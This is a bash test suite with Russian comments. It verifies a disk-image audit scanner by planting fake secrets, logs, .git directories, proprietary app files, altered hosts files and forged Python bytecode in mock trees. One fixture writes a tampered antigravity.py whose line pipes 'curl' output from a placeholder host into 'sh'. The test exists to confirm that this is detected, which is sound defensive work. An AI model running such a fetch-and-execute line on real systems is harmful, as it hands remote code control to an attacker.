#!/usr/bin/env bash
#
# tools/test-checkimage.sh — проверка самой проверки.
#
# Доказывает, что tools/checkimage.sh умеет ПАДАТЬ. Собирает поддельные деревья
# образа: одно чистое — оно обязано пройти, и по одному на каждое правило — каждое
# обязано упасть и назвать находку внятной строкой.
#
# Чистое дерево нарочно содержит всё, на чём наивная проверка спотыкается в настоящем
# образе Debian: пасхалку antigravity.py из стандартной библиотеки Python, каталог
# значков hicolor/stock/code, публичные сертификаты .pem, пустой журнал apt и
# /etc/chromium.d/apikeys с ключами, которые Google выдал Debian-у. Ни одно из этого
# находкой не является — и отдельным случаем проверяется, что стоит тронуть тот же
# apikeys, как проверка его уже не прощает.
#
# Использование:
#   bash tools/test-checkimage.sh
#
# Коды возврата: 0 — все случаи сошлись, 1 — хотя бы один разошёлся.

set -euo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CHECK="$REPO/tools/checkimage.sh"
[ -f "$CHECK" ] || { echo "нет $CHECK" >&2; exit 2; }

WORK="$(mktemp -d "${TMPDIR:-/tmp}/test-checkimage.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT

PASS=0
BAD=0

# Подделки под секреты: формой похожи на настоящие, значения выдуманы.
FAKE_ANTHROPIC='sk-ant-api03-FAKEKEY000000000000000000'
FAKE_GOOGLE='AIzaSyFAKEFAKEFAKEFAKEFAKEFAKEFAKE00000'
FAKE_GOOGLE2='AIzaSyOTHEROTHEROTHEROTHEROTHEROTHER000'

md5_of() {
    if command -v md5sum >/dev/null 2>&1; then md5sum "$1" | cut -d' ' -f1
    else md5 -q "$1"; fi
}

# Четыре байта little-endian — как их пишет CPython в заголовок .pyc.
le32() {
    local n="$1" i out=""
    for i in 0 8 16 24; do out="$out\\0$(printf '%03o' $(( (n >> i) & 255 )))"; done
    printf '%b' "$out"
}

# Правдоподобный timestamp-based .pyc: магия CPython 3.13, флаги 0, время и
# заявленный размер исходника. Размер, флаги и магия задаются отдельно — каждым
# из них подделка может соврать, и на каждое враньё есть свой случай.
make_pyc() { # $1 файл, $2 заявленный размер исходника, [$3 флаги], [$4 магия-4-байта]
    {
        printf '%b' "${4:-\\0363\\015\\015\\012}"
        le32 "${3:-0}"
        le32 1755000000
        le32 "$2"
        printf 'скомпилированный байткод\n'
    } > "$1"
}

# ---------------------------------------------------------------- чистое дерево

build_clean() {
    local d="$WORK/clean" r="$WORK/clean/rootfs"
    mkdir -p "$r"/root/.config/xfce4/xfconf/xfce-perchannel-xml "$r/root/Desktop" \
             "$r/home" "$r/etc/chromium.d" "$r/etc/ssl/certs" "$r/var/log/apt" \
             "$r/var/lib/dpkg/info" "$r/opt/stol" \
             "$r/usr/lib/python3.13/__pycache__" "$r/usr/share/icons/hicolor/48x48/stock/code"

    printf 'export PS1="\\h:\\w# "\n' > "$r/root/.bashrc"
    printf '# ~/.profile\n'           > "$r/root/.profile"
    printf 'TerminalEmulator=xfce4-terminal\n' > "$r/root/.config/xfce4/helpers.rc"
    printf '<?xml version="1.0"?>\n<channel name="xfwm4"/>\n' \
        > "$r/root/.config/xfce4/xfconf/xfce-perchannel-xml/xfwm4.xml"

    local name
    for name in antigravity antigravity2 claude code gemini obsidian zcode; do
        printf '[Desktop Entry]\nType=Application\nName=%s\nExec=/opt/%s/%s\n' \
            "$name" "$name" "$name" > "$r/root/Desktop/$name.desktop"
    done

    printf '127.0.0.1\tlocalhost codoceh-stol\n::1\tlocalhost ip6-localhost\n' > "$r/etc/hosts"
    printf 'nameserver 8.8.8.8\nnameserver 8.8.4.4\n' > "$r/etc/resolv.conf"

    # Ловушка 1: ключи Debian из пакета chromium — форма настоящая, файл дистрибутивный.
    printf '# API keys assigned to Debian by Google.\nexport GOOGLE_API_KEY="%s"\n' \
        "$FAKE_GOOGLE" > "$r/etc/chromium.d/apikeys"
    printf 'Package: chromium\nStatus: install ok installed\nConffiles:\n /etc/chromium.d/apikeys %s\n\n' \
        "$(md5_of "$r/etc/chromium.d/apikeys")" > "$r/var/lib/dpkg/status"

    # Ловушка 2: публичный сертификат — .pem, но не закрытый ключ.
    printf -- '-----BEGIN CERTIFICATE-----\nMIIBkTCB+wIJALm5\n-----END CERTIFICATE-----\n' \
        > "$r/etc/ssl/certs/ca.pem"
    # Ловушка 3: журналы есть, но пустые.
    : > "$r/var/log/apt/history.log"
    : > "$r/var/log/dpkg.log"
    # Ловушка 4: пасхалка стандартной библиотеки Python, не программа Antigravity.
    # Записана в dpkg как файл пакета — только на этом основании и прощается.
    printf 'import webbrowser\nwebbrowser.open("https://xkcd.com/353/")\n' \
        > "$r/usr/lib/python3.13/antigravity.py"
    printf '%s  usr/lib/python3.13/antigravity.py\n' \
        "$(md5_of "$r/usr/lib/python3.13/antigravity.py")" \
        > "$r/var/lib/dpkg/info/libpython3.13-stdlib:arm64.md5sums"
    # Байткод dpkg не записывает — он привязан к исходнику заявленным размером.
    make_pyc "$r/usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc" \
        "$(wc -c < "$r/usr/lib/python3.13/antigravity.py" | tr -d ' ')"
    # Ловушка 5: каталог значков hicolor называется code, а VS Code тут нет.
    : > "$r/usr/share/icons/hicolor/48x48/stock/code/dummy.png"

    printf '#!/bin/sh\nexec xfce4-session\n' > "$r/opt/stol/start-gui.sh"

    {
        echo "# Белый список поддельного образа для tools/test-checkimage.sh."
        cat <<'EOF'
/home/
/root/
/root/.bashrc
/root/.config/
/root/.config/xfce4/
/root/.config/xfce4/helpers.rc
/root/.config/xfce4/xfconf/
/root/.config/xfce4/xfconf/xfce-perchannel-xml/
/root/.config/xfce4/xfconf/xfce-perchannel-xml/xfwm4.xml
/root/.profile
/root/Desktop/
/root/Desktop/antigravity.desktop
/root/Desktop/antigravity2.desktop
/root/Desktop/claude.desktop
/root/Desktop/code.desktop
/root/Desktop/gemini.desktop
/root/Desktop/obsidian.desktop
/root/Desktop/zcode.desktop
EOF
    } > "$d/manifest.txt"

    cp "$r/etc/hosts"       "$d/etc-hosts.expected"
    cp "$r/etc/resolv.conf" "$d/etc-resolv.conf.expected"
}

# Копия чистого дерева под новым именем: дальше случай её портит.
case_dir() {
    local d="$WORK/$1"
    rm -rf "$d"
    cp -R "$WORK/clean" "$d"
    printf '%s' "$d"
}

# ---------------------------------------------------------------- прогон случая

OUT=""
CODE=0
# Цвета снимаем: иначе подстроку не сопоставить с меткой находки, а без метки
# утверждение может «сойтись» о строку допуска с тем же путём — уже ловились.
run_check() {
    set +e
    OUT="$(bash "$CHECK" "$1" 2>&1 | sed $'s/\033\\[[0-9;]*m//g')"
    CODE=${PIPESTATUS[0]}
    set -e
}

report_bad() {
    BAD=$((BAD + 1))
    printf '  \033[31mПЛОХО\033[0m  %s\n' "$1"
    printf '%s\n' "$OUT" | sed 's/^/         | /'
}

# expect_clean ИМЯ КАТАЛОГ — проверка обязана пройти
expect_clean() {
    run_check "$2"
    if [ "$CODE" -ne 0 ]; then report_bad "$1: ждали код 0, получили $CODE"; return; fi
    if ! printf '%s' "$OUT" | grep -q 'ЧИСТО'; then
        report_bad "$1: код 0, но в отчёте нет слова ЧИСТО"; return
    fi
    PASS=$((PASS + 1))
    printf '  \033[32mок\033[0m     %s\n' "$1"
}

# expect_dirty ИМЯ КАТАЛОГ «род: путь»... — проверка обязана упасть, и каждый
# ожидаемый род с путём обязан стоять именно в строке НАЙДЕНО, а не в допуске.
expect_dirty() {
    local name="$1" dir="$2" want
    shift 2
    run_check "$dir"
    if [ "$CODE" -ne 1 ]; then report_bad "$name: ждали код 1, получили $CODE"; return; fi
    for want in "$@"; do
        if ! printf '%s' "$OUT" | grep -qF -- "НАЙДЕНО  $want"; then
            report_bad "$name: в отчёте нет находки «$want»"; return
        fi
    done
    PASS=$((PASS + 1))
    printf '  \033[32mок\033[0m     %s\n' "$name"
}

# expect_setup_error ИМЯ КАТАЛОГ ПОДСТРОКА — проверку провести нельзя, код 2.
# Отдельно от находок: «проверять нечем» не должно выглядеть как «чисто».
expect_setup_error() {
    run_check "$2"
    if [ "$CODE" -ne 2 ]; then report_bad "$1: ждали код 2, получили $CODE"; return; fi
    if ! printf '%s' "$OUT" | grep -qF -- "$3"; then
        report_bad "$1: в отчёте нет строки про «$3»"; return
    fi
    PASS=$((PASS + 1))
    printf '  \033[32mок\033[0m     %s\n' "$1"
}

# Отдельно: значение, похожее на ключ, в отчёт попасть не должно.
expect_hidden() {
    if printf '%s' "$OUT" | grep -qF -- "$1"; then
        BAD=$((BAD + 1))
        printf '  \033[31mПЛОХО\033[0m  %s: найденное значение напечатано в отчёте\n' "$2"
    else
        PASS=$((PASS + 1))
        printf '  \033[32mок\033[0m     %s: значение не напечатано, назван только файл\n' "$2"
    fi
}

# ---------------------------------------------------------------- случаи

printf '\033[1m==>\033[0m поддельные деревья образа\n'
build_clean

D="$(case_dir 01-clean)"
expect_clean "чистое дерево проходит" "$D"
if ! printf '%s' "$OUT" | grep -q 'допуск'; then
    BAD=$((BAD + 1))
    printf '  \033[31mПЛОХО\033[0m  чистое дерево: ловушки Debian прошли молча, а должны через допуск\n'
else
    PASS=$((PASS + 1))
    printf '  \033[32mок\033[0m     ловушки Debian прошли именно как допуск, а не молча\n'
fi

D="$(case_dir 02-ssh)"
mkdir -p "$D/rootfs/root/.ssh"
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEA\n-----END OPENSSH PRIVATE KEY-----\n' \
    > "$D/rootfs/root/.ssh/id_ed25519"
expect_dirty "подложен ~/.ssh" "$D" \
    "лишний путь вне манифеста: /root/.ssh/" \
    "каталог учётных данных: /root/.ssh" \
    "файл ключа, учётки или сессии: /root/.ssh/id_ed25519"

D="$(case_dir 03-history)"
printf 'ssh cebers@100.84.177.25\n' > "$D/rootfs/root/.bash_history"
echo '/root/.bash_history' >> "$D/manifest.txt"   # в манифесте: падает именно правило истории
expect_dirty "непустой .bash_history" "$D" "непустая история: /root/.bash_history"
if printf '%s' "$OUT" | grep -q 'лишний путь'; then
    BAD=$((BAD + 1))
    printf '  \033[31mПЛОХО\033[0m  правило истории сработало вместе с белым списком, а должно само\n'
else
    PASS=$((PASS + 1))
    printf '  \033[32mок\033[0m     правило истории падает само по себе, без белого списка\n'
fi

D="$(case_dir 04-log)"
printf 'Start-Date: 2026-08-17\nCommandline: apt install obsidian\n' > "$D/rootfs/var/log/apt/history.log"
expect_dirty "непустой журнал" "$D" "непустой журнал: /var/log/apt/history.log"

D="$(case_dir 05-git)"
mkdir -p "$D/rootfs/opt/stol/.git"
printf '[core]\n\trepositoryformatversion = 0\n' > "$D/rootfs/opt/stol/.git/config"
expect_dirty "каталог .git" "$D" "каталог git: /opt/stol/.git"

D="$(case_dir 06-proprietary)"
# Первые две ловятся по известному пути установки, вторые две — только по имени,
# по путям, которых никто заранее не перечислял. Ярлык не из манифеста тоже находка:
# прощаются ровно семь объявленных, а не всё, что назвали .desktop.
mkdir -p "$D/rootfs/usr/share/code/bin" "$D/rootfs/opt/obsidian-app" \
         "$D/rootfs/opt/ZCode-3.7.7-arm64" "$D/rootfs/usr/local/share/antigravity2" \
         "$D/rootfs/opt/rogue/Desktop"
printf '#!/bin/sh\n' > "$D/rootfs/usr/share/code/bin/code"
printf 'AppImage\n'  > "$D/rootfs/opt/obsidian-app/obsidian.AppImage"
printf 'ELF\n'       > "$D/rootfs/opt/ZCode-3.7.7-arm64/zcode.bin"
printf 'asar\n'      > "$D/rootfs/usr/local/share/antigravity2/app.asar"
printf '[Desktop Entry]\nName=Obsidian\n' > "$D/rootfs/opt/rogue/Desktop/obsidian.desktop"
expect_dirty "файлы проприетарных программ" "$D" \
    "VS Code: /usr/share/code" \
    "Obsidian: /opt/obsidian-app" \
    "ZCode: /opt/ZCode-3.7.7-arm64" \
    "Antigravity 2.0: /usr/local/share/antigravity2" \
    "Obsidian: /opt/rogue/Desktop/obsidian.desktop"

D="$(case_dir 07-extra)"
printf 'заметки владельца\n' > "$D/rootfs/root/notes.txt"
expect_dirty "лишний путь вне манифеста" "$D" "лишний путь вне манифеста: /root/notes.txt"

D="$(case_dir 08-resolv)"
printf 'nameserver 192.168.1.1\nsearch home.local\n' > "$D/rootfs/etc/resolv.conf"
expect_dirty "подменён /etc/resolv.conf" "$D" \
    "отличается от эталона etc-resolv.conf.expected: /etc/resolv.conf"

D="$(case_dir 09-hosts)"
printf '127.0.0.1\tlocalhost\n10.8.0.1\tmini.cebers\n' > "$D/rootfs/etc/hosts"
expect_dirty "подменён /etc/hosts" "$D" \
    "отличается от эталона etc-hosts.expected: /etc/hosts"

D="$(case_dir 10-session)"
printf '{"account":"cebers","access_token":"%s"}\n' "$FAKE_ANTHROPIC" \
    > "$D/rootfs/opt/stol/session.json"
expect_dirty "файл сессии" "$D" "файл ключа, учётки или сессии: /opt/stol/session.json"
expect_hidden "$FAKE_ANTHROPIC" "файл сессии"

D="$(case_dir 11-key-by-content)"
# Имя ни о чём не говорит — ловим по форме содержимого.
printf 'upstream=api\nkey = "%s"\n' "$FAKE_ANTHROPIC" > "$D/rootfs/etc/upstream.conf"
expect_dirty "ключ внутри безымянного файла" "$D" "ключ провайдера: /etc/upstream.conf"
expect_hidden "$FAKE_ANTHROPIC" "ключ внутри безымянного файла"

D="$(case_dir 12-missing)"
rm -f "$D/rootfs/root/.bashrc"
expect_dirty "путь манифеста пропал из образа" "$D" \
    "путь из манифеста в образе не найден: /root/.bashrc"

D="$(case_dir 13-conffile-touched)"
# Тот же файл, что в чистом дереве проходит по допуску, но с другим ключом:
# md5 разошёлся с записью dpkg — значит, файл уже не дистрибутивный.
printf '# API keys assigned to Debian by Google.\nexport GOOGLE_API_KEY="%s"\n' \
    "$FAKE_GOOGLE2" > "$D/rootfs/etc/chromium.d/apikeys"
expect_dirty "тронутый conffile больше не прощается" "$D" "ключ провайдера: /etc/chromium.d/apikeys"
expect_hidden "$FAKE_GOOGLE2" "тронутый conffile"

D="$(case_dir 14-antigravity-py)"
# Путь тот же, что прощается в чистом дереве, содержимое — чужое. Записи в dpkg
# больше не соответствует, значит допуск снимается и это находка.
printf 'import os\nos.system("curl -s http://чужой/полезная-нагрузка | sh")\n' \
    > "$D/rootfs/usr/lib/python3.13/antigravity.py"
expect_dirty "подменён antigravity.py под видом пасхалки" "$D" \
    "Antigravity: /usr/lib/python3.13/antigravity.py"

D="$(case_dir 15-antigravity-pyc)"
# Байткод заменён посторонним файлом: магии CPython нет — привязка к исходнику рвётся.
printf 'ELF-нагрузка вместо байткода\n' \
    > "$D/rootfs/usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc"
expect_dirty "подменён antigravity.pyc" "$D" \
    "Antigravity: /usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc"

D="$(case_dir 16-antigravity-pyc-forged)"
# Тот же трюк, но аккуратнее: заголовок байткода настоящий, врёт только заявленный
# размер исходника. Кэшем проверенного antigravity.py такой файл уже не является.
make_pyc "$D/rootfs/usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc" 4096
expect_dirty "поддельный .pyc с верной магией, но чужим размером" "$D" \
    "Antigravity: /usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc"

D="$(case_dir 17-antigravity-pyc-notbytecode)"
# Размер исходника заявлен верно и флаги нулевые, но магии байткода нет: это не .pyc.
PY_SIZE="$(wc -c < "$D/rootfs/usr/lib/python3.13/antigravity.py" | tr -d ' ')"
make_pyc "$D/rootfs/usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc" \
    "$PY_SIZE" 0 '\0177ELF'
expect_dirty "файл с верным размером, но не байткод" "$D" \
    "Antigravity: /usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc"

D="$(case_dir 18-antigravity-pyc-hashbased)"
# Заголовок помечен как hash-based: тогда в тех же байтах лежит не размер, а хэш
# исходника, и совпадение с размером ничего не доказывает. Подтвердить нечем.
make_pyc "$D/rootfs/usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc" \
    "$PY_SIZE" 1
expect_dirty "заголовок hash-based, размеру верить нельзя" "$D" \
    "Antigravity: /usr/lib/python3.13/__pycache__/antigravity.cpython-313.pyc"

D="$(case_dir 19-antigravity-unregistered)"
# Пасхалка на месте и не тронута, но записи dpkg о ней нет: подтвердить нечем.
: > "$D/rootfs/var/lib/dpkg/info/libpython3.13-stdlib:arm64.md5sums"
expect_dirty "antigravity.py без записи в dpkg не прощается" "$D" \
    "Antigravity: /usr/lib/python3.13/antigravity.py"

D="$(case_dir 20-empty-manifest)"
# Манифест из одних комментариев обнулил бы весь белый список. Это не «чисто»,
# это «проверить нечем» — и звучать должно по-разному.
printf '# только комментарий\n\n' > "$D/manifest.txt"
expect_setup_error "пустой манифест — не повод сказать «чисто»" "$D" "manifest.txt пуст"

# ---------------------------------------------------------------- итог

printf '\n'
if [ "$BAD" -eq 0 ]; then
    printf '\033[32mГОТОВО\033[0m  сошлось проверок: %d, разошлось: 0\n' "$PASS"
else
    printf '\033[31mПРОВАЛ\033[0m  сошлось: %d, разошлось: %d\n' "$PASS" "$BAD"
    exit 1
fi
